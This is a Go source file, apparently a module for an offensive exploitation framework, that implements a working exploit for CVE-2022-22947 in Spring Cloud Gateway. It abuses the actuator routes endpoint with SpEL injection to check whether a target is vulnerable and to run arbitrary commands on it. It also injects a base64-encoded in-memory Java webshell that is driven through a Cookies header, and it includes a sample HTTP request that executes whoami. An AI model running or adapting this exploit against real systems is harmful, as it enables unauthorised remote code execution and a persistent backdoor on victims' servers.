package exp_spring

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
	"time"
)

type Exp_CVE_2022_22947 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_22947) GetMsg1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	meta1 := goutils.RandomHexString(16)
	meta2 := goutils.RandomHexString(16)

	payload := fmt.Sprintf(`{
  "id": "{{id}}",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{\"%s\" + \"%s\"}"
    }
  }],
  "uri": "{{url}}"
}`, meta1, meta2)
	route := self.GetItemSafe(self.Params.Options.CmdSubOptions, "route")
	if route == "" {
		route = goutils.RandStr(7)
	}
	payload = strings.ReplaceAll(payload, "{{id}}", route)
	payload = strings.ReplaceAll(payload, "{{url}}", self.Params.Target)
	payload = strings.ReplaceAll(payload, "{{cmd}}", cmd)

	// 添加路由
	self.EchoInfoMsg(fmt.Sprintf("add route %s.", route))
	headers.Set("Content-Type", "application/json")
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 201 {
		self.EchoErrMsg(fmt.Sprintf("add route %s failed.", route))
		return
	}
	headers.Del("Content-Type")

	// 刷新路由
	self.EchoInfoMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("refresh route failed."))
		//return
	}
	self.EchoInfoMsg("wait 5s......")
	time.Sleep(5 * time.Second)
	// 请求路由
	self.EchoInfoMsg("request route.")
	httpresp = self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	tmp := regexp.MustCompile(`Result = '(.*?)'`).FindStringSubmatch(httpresp.Body)
	if len(tmp) == 0 {
		self.EchoErrMsg("request route failed.")
		//return
	} else {
		if strings.Contains(tmp[1], meta1+meta2) {
			self.EchoInfoMsg("vul is exist")
		} else {
			self.EchoErrMsg("vul is not exist")
		}

	}

	// 删除路由
	self.EchoInfoMsg(fmt.Sprintf("delete route %s.", route))
	httpresp = self.HttpDeleteWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("delete route %s failed.", route))
		//return
	}

	// 刷新路由
	self.EchoInfoMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("refresh route failed."))
		//return
	}

	return
}

func (self *Exp_CVE_2022_22947) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	payload := `{
  "id": "{{id}}",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"{{cmd}}\").getInputStream()))}"
    }
  }],
  "uri": "{{url}}"
}`
	route := self.GetItemSafe(self.Params.Options.CmdSubOptions, "route")
	if route == "" {
		route = goutils.RandStr(7)
	}
	payload = strings.ReplaceAll(payload, "{{id}}", route)
	payload = strings.ReplaceAll(payload, "{{url}}", self.Params.Target)
	payload = strings.ReplaceAll(payload, "{{cmd}}", cmd)

	// 添加路由
	self.EchoInfoMsg(fmt.Sprintf("add route %s.", route))
	headers.Set("Content-Type", "application/json")
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 201 {
		self.EchoErrMsg(fmt.Sprintf("add route %s failed.", route))
		return
	}
	headers.Del("Content-Type")

	// 刷新路由
	self.EchoInfoMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("refresh route failed."))
		//return
	}
	self.EchoInfoMsg("wait 5s......")
	time.Sleep(5 * time.Second)
	// 请求路由
	self.EchoInfoMsg("request route.")
	httpresp = self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	expResult.RawResult = httpresp.RawFullResp
	tmp := regexp.MustCompile(`Result = '(.*?)'`).FindStringSubmatch(httpresp.Body)
	if len(tmp) == 0 {
		self.EchoErrMsg("request route failed.")
		//return
	} else {
		result := strings.ReplaceAll(tmp[1], `\r`, "\r")
		result = strings.ReplaceAll(result, `\n`, "\n")
		self.EchoInfoMsg(fmt.Sprintf("cmd result: \n%s", result))
	}

	// 删除路由
	self.EchoInfoMsg(fmt.Sprintf("delete route %s.", route))
	httpresp = self.HttpDeleteWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("delete route %s failed.", route))
		//return
	}

	// 刷新路由
	self.EchoInfoMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("refresh route failed."))
		//return
	}

	return
}

func (self *Exp_CVE_2022_22947) Upload1(filename string, content string) (expUploadResult exp_model.ExpUploadResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	spel := `#{T(org.springframework.cglib.core.ReflectUtils).defineClass('SpringRequestMappingMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADIAmQoABgBTCABUCgAGAFUIADMHAFYHAFcHAFgHAFkKAAUAWgoABwBbBwBcCAA1BwBdBwBeCgAOAFMIAF8KAA4AYAcAYQcAYgoAEgBjBwBkCABQCgAVAGUIAGYKAAgAZwoACwBTCgAHAGgIAGkHAGoIAGsHAGwKAG0AbgoAbQBvCgBwAHEKAB8AcggAcwoAHwB0CgAfAHUHAHYJAHcAeAoAJwB5AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB5MU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbDsBAAhkb0luamVjdAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAC3BhdGhQYXR0ZXJuAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybjsBABhwYXR0ZXJuc1JlcXVlc3RDb25kaXRpb24BAExMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247AQAXaGVhZGVyc1JlcXVlc3RDb25kaXRpb24BAEtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbjsBABJyZXF1ZXN0TWFwcGluZ0luZm8BAENMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcBABJMamF2YS9sYW5nL09iamVjdDsBAANtc2cBABJMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBXBwBdBwBqAQA9KExqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5OwEAA2NtZAEACmV4ZWNSZXN1bHQBAApFeGNlcHRpb25zBwB6AQAiUnVudGltZVZpc2libGVQYXJhbWV0ZXJBbm5vdGF0aW9ucwEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdEhlYWRlcjsBAAV2YWx1ZQEAB0Nvb2tpZXMBAApTb3VyY2VGaWxlAQAhU3ByaW5nUmVxdWVzdE1hcHBpbmdNZW1zaGVsbC5qYXZhDAAqACsBAAxpbmplY3Qtc3RhcnQMAHsAfAEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwwAfQB+DAB/AIABABxTcHJpbmdSZXF1ZXN0TWFwcGluZ01lbXNoZWxsAQAQamF2YS9sYW5nL1N0cmluZwEANm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVyblBhcnNlcgEAAi8qDACBAIIBAEpvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3V0aWwvcGF0dGVybi9QYXRoUGF0dGVybgwAKgCDAQBJb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9IZWFkZXJzUmVxdWVzdENvbmRpdGlvbgwAKgCEAQAADAAqAIUMAIYAhwEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEADGluamVjdC1lcnJvcgEAEWphdmEvdXRpbC9TY2FubmVyBwCIDACJAIoMAIsAjAcAjQwAjgCPDAAqAJABAAJcQQwAkQCSDACTAJQBACdvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHkHAJUMAJYAlwwAKgCYAQATamF2YS9pby9JT0V4Y2VwdGlvbgEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAFcGFyc2UBAEYoTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm47AQA2KFtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvdXRpbC9wYXR0ZXJuL1BhdGhQYXR0ZXJuOylWAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgECJChMamF2YS9sYW5nL1N0cmluZztMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9QYXR0ZXJuc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1BhcmFtc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vSGVhZGVyc1JlcXVlc3RDb25kaXRpb247TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvY29uZGl0aW9uL1Byb2R1Y2VzUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L2NvbmRpdGlvbi9SZXF1ZXN0Q29uZGl0aW9uOylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAAsABgAAAAAAAwABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAABMALgAAAAwAAQAAAAUALwAwAAAACQAxADIAAQAsAAABdAAKAAgAAAClEgJMKrYAAxIEBr0ABVkDEgZTWQQSB1NZBRIIU7YACU0sBLYAChILEgwEvQAFWQMSDVO2AAlOuwAOWbcADxIQtgAROgS7ABJZBL0AE1kDGQRTtwAUOgW7ABVZBL0ADVkDEhZTtwAXOga7AAhZEhgZBQEBGQYBAQG3ABk6BywqBr0ABlkDuwALWbcAGlNZBC1TWQUZB1O2ABtXEhxMpwAHTRIeTCuwAAEAAwCcAJ8AHQADAC0AAAA6AA4AAAAVAAMAFwAgABgAJQAZADYAGgBEABsAVgAdAGgAHgB8AB8AmQAgAJwAIwCfACEAoAAiAKMAJAAuAAAAXAAJACAAfAAzADQAAgA2AGYANQA0AAMARABYADYANwAEAFYARgA4ADkABQBoADQAOgA7AAYAfAAgADwAPQAHAKAAAwA+AD8AAgAAAKUAQABBAAAAAwCiAEIAQwABAEQAAAATAAL/AJ8AAgcARQcARgABBwBHAwABADUASAADACwAAABoAAQAAwAAACa7AB9ZuAAgK7YAIbYAIrcAIxIktgAltgAmTbsAJ1kssgAotwApsAAAAAIALQAAAAoAAgAAACgAGgApAC4AAAAgAAMAAAAmAC8AMAAAAAAAJgBJAEMAAQAaAAwASgBDAAIASwAAAAQAAQBMAE0AAAAMAQABAE4AAQBPcwBQAAEAUQAAAAIAUg=='),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping)}`
	// 构造payload
	payload := `{
  "id": "{{id}}",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "{{spel}}"
    }
  }],
  "uri": "{{url}}"
}`
	route := self.GetItemSafe(self.Params.Options.CmdSubOptions, "route")
	if route == "" {
		route = goutils.RandStr(7)
	}
	payload = strings.ReplaceAll(payload, "{{id}}", route)
	payload = strings.ReplaceAll(payload, "{{url}}", self.Params.Target)
	payload = strings.ReplaceAll(payload, "{{spel}}", spel)

	// 添加路由
	self.EchoInfoMsg(fmt.Sprintf("add route %s.", route))
	headers.Set("Content-Type", "application/json")
	httpresp := self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), payload, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 201 {
		self.EchoErrMsg(fmt.Sprintf("add route %s failed.", route))
		return
	}
	headers.Del("Content-Type")

	// 刷新路由
	self.EchoInfoMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("refresh route failed."))
		//return
	}
	self.EchoInfoMsg("wait 5s......")
	time.Sleep(5 * time.Second)

	// 请求路由
	self.EchoInfoMsg("request route.")
	httpresp = self.HttpGetWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	expUploadResult.RawResult = httpresp.RawFullResp
	tmp := regexp.MustCompile(`Result = '(.*?)'`).FindStringSubmatch(httpresp.Body)
	if len(tmp) == 0 {
		self.EchoErrMsg("request route failed.")
		//return
	} else {
		result := strings.ReplaceAll(tmp[1], `\r`, "\r")
		result = strings.ReplaceAll(result, `\n`, "\n")
		self.EchoInfoMsg(fmt.Sprintf("cmd result: \n%s", result))
		if strings.Contains(result, "inject-success") {
			expUploadResult.Status = true
			expUploadResult.Msg = "任意路径，header头部插入Cookies字段输入命令即可"
		}
	}

	// 删除路由
	self.EchoInfoMsg(fmt.Sprintf("delete route %s.", route))
	httpresp = self.HttpDeleteWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("delete route %s failed.", route))
		//return
	}

	// 刷新路由
	self.EchoInfoMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(self.AppendUri(self.Params.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg(fmt.Sprintf("refresh route failed."))
		//return
	}

	return
}
func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())
	expmsg := exp_model.ExpMsg{
		Author: "lz520520",
		Time:   `2022-03-02`,
		Range: `
Spring Cloud Gateway
3.1.0
3.0.0至3.0.6
其他老版本
`,
		ID:       `CVE-2022-22947`,
		Describe: `CVE-2022-22947 SpringCloud GateWay SPEL RCE`,
		Details: `
获取信息：
验证漏洞是否存在

命令执行：
URL不要跟路径，输入cmd执行即可
PS: 如果执行失败，会导致后续利用失败. 但删除这条路由即可

文件上传：
是内存马注入，直接点上传即可，会注入一个cmd马，header头添加Cookies: cmd即可

`,
		Payload: `
POST /prod-api/actuator/gateway/routes/AAAAAAAAAAAAAAAAA HTTP/1.1
Host: 192.168.111.1:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Content-Length: 337
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close

{
  "id": "AAAAAAAAAAAAAAAAA",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()))}"
    }
  }],
  "uri": "http://192.168.111.1:8083/prod-api/"
}
`,
		VulType: common.VulCodeExec,
	}

	expSubOption := exp_model.ExpSubOption{
		CmdContent: "",
		CmdSubOptions: []exp_model.ExpSubOptionItem{
			{
				StaticText: "Route: ",
				Key:        "route",
				Value:      "AAAAAAAAAAAAAAAA",
			},
		},
	}

	subOptions := map[string]exp_model.ExpSubOption{
		"": expSubOption,
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg:        expmsg,
		SubOptions: subOptions,
		AliasMap:   nil,
	}
	exp_register.ExpStructRegister(&Exp_CVE_2022_22947{}, registerMsg)

}
